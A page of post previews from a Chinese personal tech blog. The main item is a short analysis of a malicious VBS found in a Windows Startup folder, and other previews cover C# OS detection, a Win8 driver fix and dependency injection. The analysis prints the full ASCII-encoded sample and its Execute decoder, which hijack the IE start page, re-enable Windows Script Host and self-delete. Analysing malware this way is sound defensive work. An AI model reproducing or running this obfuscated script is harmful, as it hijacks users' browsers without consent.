+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 25, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (148 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner &amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
+解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&ldquo;winmgmts:\.\root\cimv2&rdquo;) Set colProcesses = objWMIService.ExecQuery(&ldquo;Select * from Win32_Process&rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &ldquo;userinit.exe&rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.
+                  <a href="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%AC%94%E8%AE%B0/">笔记</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/">
+                <h2 class="post-title">获取操作系统版本信息</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 23, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (274 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  坊间流传的代码都有些问题，比如不能正常获取win7以上的版本信息，不能获取诸如专业版，旗舰版等的信息，不能正常获取操作系统位的信息。
+使用代码，写了一个简单的库来实现效果。用法大概如下： StringBuilder sb = new StringBuilder(String.Empty); sb.AppendLine(&ldquo;Operation System Information&rdquo;); sb.AppendLine(&ldquo;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-&rdquo;); sb.AppendLine(String.Format(&ldquo;Name = {0}&rdquo;, OSVersionInfo.Name)); sb.AppendLine(String.Format(&ldquo;Edition = {0}&rdquo;, OSVersionInfo.Edition)); if (OSVersionInfo.ServicePack!=string.Empty) sb.AppendLine(String.Format(&ldquo;Service Pack = {0}&rdquo;, OSVersionInfo.ServicePack)); else sb.AppendLine(&ldquo;Service Pack = None&rdquo;); sb.AppendLine(String.Format(&ldquo;Version = {0}&rdquo;, OSVersionInfo.VersionString)); sb.AppendLine(String.Format(&ldquo;ProcessorBits = {0}&rdquo;, OSVersionInfo.ProcessorBits)); sb.AppendLine(String.Format(&ldquo;OSBits = {0}&rdquo;, OSVersionInfo.OSBits)); sb.AppendLine(String.Format(&ldquo;ProgramBits = {0}&rdquo;, OSVersionInfo.ProgramBits));
+textBox1.Text = sb.ToString(); 对比一下坊间的几种不足： 总的来说。最大的问题就是不能正确检测你的操作系统到底是32位还是64位。几种方法大致如下： 1. 使用IntPtr指针的大小 最关键的一句代码是： return IntPtr.Size * 8; 但是事实上，这个返回的不是操作系统的位数，返回的是运行的程序的位数，如果在64位的windows上以32位的模式运行了这个程序，那么就会返回32.
+2. 使用PROCESSOR_ARCHITECTURE 环境变量 string pa = Environment.GetEnvironmentVariable(&ldquo;PROCESSOR_ARCHITECTURE&rdquo;); return ((String.IsNullOrEmpty(pa) || String.
+                  <a href="https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/21/%E8%A7%A3%E5%86%B3win8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E7%9A%84%E9%97%AE%E9%A2%98/">
+                <h2 class="post-title">解决win8无法上网的问题</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 21, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (14 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  <p>昨天晚上@虎振兴同学装了win8.。结果悲剧了。症状为连接宽带可以连接上。上qq也正常。但是。只要打开网页。就会自动断网。再连接就会提示651错误了。网上大多说是驱动不兼容。但是解决的方法大部分是不对的。下面结合网上的给大家说一说。。</p>
+
+<p>网卡驱动目测是都是美满公司，也就是Marvell 的Yukon系列网卡驱动的问题。首先下载一个旧版本的驱动（<a href="http://pan.baidu.com/share/link?shareid=157758&amp;uk=1493685990">32位下载</a>/<a href="http://pan.baidu.com/share/link?shareid=157761&amp;uk=1493685990">64位下载</a>）
+然后按下图操作，第一步是打开计算机-管理。。各种姿势只要打开了计算机管理就可以了。
+<a href="http://leaverimage.b0.upaiyun.com/29531_o.jpg"><img src="/images/64492d91b55bcb36bfca307f79e7085701e4d385.jpg" alt="" title="1" /></a>
+在这里稍微记一下这个名字。Marvell Yukon  88exxxxx  PCI-E Fast Ethernet..
+<a href="http://leaverimage.b0.upaiyun.com/29542_o.jpg"><img src="/images/f62bc3bc8f6c801bb02b7ac3b5828cd8b8949409.jpg" alt="" title="2" /></a>
+找到网络适配器，右键更新驱动程序。
+<a href="http://leaverimage.b0.upaiyun.com/29532_o.jpg"><img src="/images/de07155b61319d7d4bcd6850502b67cf08e010e7.jpg" alt="" title="3" /></a>
+<a href="http://leaverimage.b0.upaiyun.com/29534_o.jpg"><img src="/images/31566293ba5a32fff3f1654f50247e65824c1def.jpg" alt="" title="4" /></a>
+<a href="http://leaverimage.b0.upaiyun.com/29535_o.jpg"><img src="/images/b77e3594df179d35a82777375611b20549290884.jpg" alt="" title="5" /></a>
+注意记下兼容的网卡。名字和第二步的差不多的那个，点击从磁盘安装，选择下载后驱动的解压的安装文件，如图
+<a href="http://leaverimage.b0.upaiyun.com/29536_o.jpg"><img src="/images/925d77e1da47d263c1e41785765b5af2b6152818.jpg" alt="" title="6" /></a>
+到这一步以后，点击打开，可能会出现一个驱动列表。这是时候选择一个和兼容列表名字一样的。88e这部分不一样。如果找不到，也可以找类似的，比如途中给出的后两位是39.我装的是40也没问题。这个是驱动的历史版本。然后就可以了
+<a href="http://leaverimage.b0.upaiyun.com/29538_o.jpg"><img src="/images/02f918179789c33bccb038983bae0125c0d0d988.jpg" alt="" title="9" /></a></p>
+
+<p>最后。提醒各位童鞋。win8整体还是很不错的。不过呢。对于我来说。metro界面和正常的界面的傻傻分不清楚的模式。令我很是蛋疼。。所以暂时没有考虑换到win8.。。</p>
+
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E4%BA%92%E8%81%94%E7%BD%91/">互联网</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/21/%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F/">
+                <h2 class="post-title">依赖倒置原则和依赖注入模式</h2>
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 21, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (213 words)
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  昨天读完了程杰的《大话设计模式》。。收获颇丰。深刻感到了设计模式的伟大。。对面向接口的编程也理解了不少。刚好看到codeproject上一篇将依赖倒置的。讲到了依赖注入的方式。仔细读了一下。翻译一遍加深认识。
+高耦合的代码随着项目复杂性的不断增加，最终会变成一碗碗的意大利面条啦。。二者通常是软件设计上的问题，如果一个类对另一个类的实现了解太多。当该类改变的时候会引起更多的改变。这违反了依赖倒置原则
+而松耦合的代码设计优良。随着时间流逝，代码复杂两增大，松耦合的好处会变得更加清晰，依赖注入模式是实现松耦合的一个好的办法，本文介绍在没有依赖注入容器的情况下实现依赖注入
+GoF说了，依赖倒置的原则：
+ 高层模块不应依赖于低层模块，他们都应该依赖于抽象 抽象不依赖细节，细节依赖抽象
+ 刚开始写依赖倒置比较难，随着经验增长会有所改善，通过使高层模块依赖于抽象，依赖倒置成功解耦，依赖注入模式是该原则的一个实现。
+通常我们写出如下的代码：
+public class Email { public void SendEmail() { // code } } public class Notification { private Email _email; public Notification() { _email = new Email(); } public void PromotionalNotification() { _email.SendEmail(); } }  Notification类依赖Email类，这违反了DIP，而且当我们要发送短信/保存到数据库的时候，我们还要改变Notification类。 我们使用抽象类/接口解耦
+public interface IMessageService { void SendMessage(); } public class Email : IMessageService { public void SendMessage() { // code } } public class Notification { private IMessageService _iMessageService; public Notification() { _iMessageService = new Email(); } public void PromotionalNotification() { _iMessageService.
+                  <a href="https://leizhiyuan.github.io/2012/11/21/%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+        </div>
+
+        
+          <ul class="pager main-pager">
+            
+              <li class="previous">
+                <a href="https://leizhiyuan.github.io/page/14/">&larr; Newer Posts</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="https://leizhiyuan.github.io/page/16/">Older Posts &rarr;</a>
+              </li>
+            
+          </ul>
+        
+      </div>
+    </div>
+  </div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/leizhiyuan" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://leizhiyuan.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="leaver.me">bystander</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.49.2</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/main.js"></script>
+<script src="https://leizhiyuan.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://leizhiyuan.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
